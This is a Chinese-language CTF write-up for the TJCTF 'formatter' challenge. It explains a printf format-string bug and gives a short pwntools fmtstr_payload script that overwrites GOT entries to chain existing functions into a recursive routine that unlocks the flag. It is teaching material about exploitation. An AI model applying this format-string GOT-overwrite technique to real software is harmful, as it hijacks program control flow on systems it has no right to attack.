# formatter

## 题目简述

程序把用户输入直接交给 `printf(str)`，存在格式化字符串任意写。真正的目标不是直接覆盖返回地址，而是改写 GOT，把程序已有的 `r1`、`r2` 组合成递归状态机，使堆上整数 `*xd` 最终等于 `0x086a693e`，从而通过 `win()` 检查。

## 解题过程

格式串参数偏移为 6。官方脚本用 `fmtstr_payload` 改写：

```python
from pwn import ELF, fmtstr_payload

exe = ELF("./bin/chall", checksec=False)
payload = fmtstr_payload(6, {
    exe.got["putw"]: exe.sym["r1"],
    exe.got["puts"]: exe.sym["r2"],
    exe.got["printf"]: exe.sym["r3"],
})
```

对发布二进制的实际反汇编核对后，`r2` 中的 `printf("a")` 已被编译器优化成 `putchar('a')`，所以第三项 `printf → r3` 在该二进制中不会参与最终状态；真正生效的调用链是：

```text
r1(n): xd += 2; putw(n - 1) -> r1(n - 1); puts(...) -> r2()
r2():  xd *= 3
```

pwntools 生成的 payload 首字节是 `%`，即 $n=37$。考虑 32 位整数回绕，递归结果为

$$
x_n=2n\cdot3^n\pmod{2^{32}},
$$

从而

$$
x_{37}=0x086a693e.
$$

`win()` 检查通过并输出：

```text
tjctf{f0rm4tt3d_5883cc30}
```

## 方法总结

- 格式化字符串漏洞可以改写 GOT，把原本无害的函数拼成新的控制流，而不必总是走返回地址覆盖。
- 分析利用时应以发布二进制为准；源码中的 `printf("a")` 在实际产物里变成了 `putchar`，官方 payload 的一项写入因此是冗余的。
- 递归状态机还涉及 32 位溢出，应在模 $2^{32}$ 下推导并本地复算目标常量。
